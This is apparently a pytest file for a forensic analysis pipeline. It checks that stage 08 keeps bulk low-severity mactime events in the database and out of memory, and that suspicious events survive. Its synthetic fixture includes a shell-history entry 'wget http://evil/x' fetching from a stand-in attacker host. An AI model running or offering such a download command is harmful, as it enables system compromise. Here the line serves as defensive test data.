"""Stage 08 OOM-Schutz: mactime/info-Bulk bleibt in der DB, nicht im RAM.

Regression: Stage 08 lud mit get_all_sorted() ALLE Events als Python-
Objekte in ctx.normalized_events. Mit den Fixes (4x mactime, journald)
explodierte die Eventzahl -> der Prozess wurde vom OOM-Killer beendet.
"""
import sys
import tempfile
from pathlib import Path
from datetime import datetime, timezone

sys.path.insert(0, str(Path(__file__).parent.parent))

from models.pipeline_context import PipelineContext
from models.event import ForensicEvent
from utils.event_store import EventStore
import stages.stage08_normalize as s8


def _make(n_mactime_info):
    base = datetime(2024, 5, 1, 12, tzinfo=timezone.utc)
    events = [ForensicEvent(timestamp=base, source='mactime', event_type='filesystem_a',
              message=f'/usr/lib/f{i}', file_path=f'/usr/lib/f{i}', severity='info')
              for i in range(n_mactime_info)]
    events += [
        ForensicEvent(timestamp=base, source='auth', event_type='ssh_login_success',
                      message='Accepted password for root from 1.2.3.4', severity='medium', ip='1.2.3.4'),
        ForensicEvent(timestamp=base, source='bash_history', event_type='shell_command',
                      message='wget http://evil/x', severity='high'),
        ForensicEvent(timestamp=base, source='mactime', event_type='filesystem_mb',
                      message='/tmp/x.sh', file_path='/tmp/x.sh', severity='medium'),
    ]
    case = Path(tempfile.mkdtemp()) / 'case'
    case.mkdir()
    db = case / 'events.db'
    with EventStore(db) as s:
        s.insert_events(events)
    ctx = PipelineContext(case_dir=case, timezone='UTC')
    ctx.events_db_path = db
    return ctx, db


def test_mactime_info_bulk_nicht_im_ram():
    ctx, db = _make(500)
    ctx = s8.run(ctx)
    # mactime/info darf NICHT im RAM sein
    assert not any(e.source == 'mactime' and e.severity == 'info' for e in ctx.normalized_events)
    # alle forensisch relevanten Events bleiben (auth, bash_history, verdaechtige mactime)
    assert len(ctx.normalized_events) == 3
    srcs = {(e.source, e.severity) for e in ctx.normalized_events}
    assert ('auth', 'medium') in srcs and ('bash_history', 'high') in srcs
    assert ('mactime', 'medium') in srcs   # verdaechtige mactime (/tmp) bleibt


def test_vollbestand_in_db_erhalten():
    ctx, db = _make(500)
    ctx = s8.run(ctx)
    with EventStore(db) as s:
        assert s.count() == 503   # Stage 8.5 + Filesystem-Excel lesen von hier
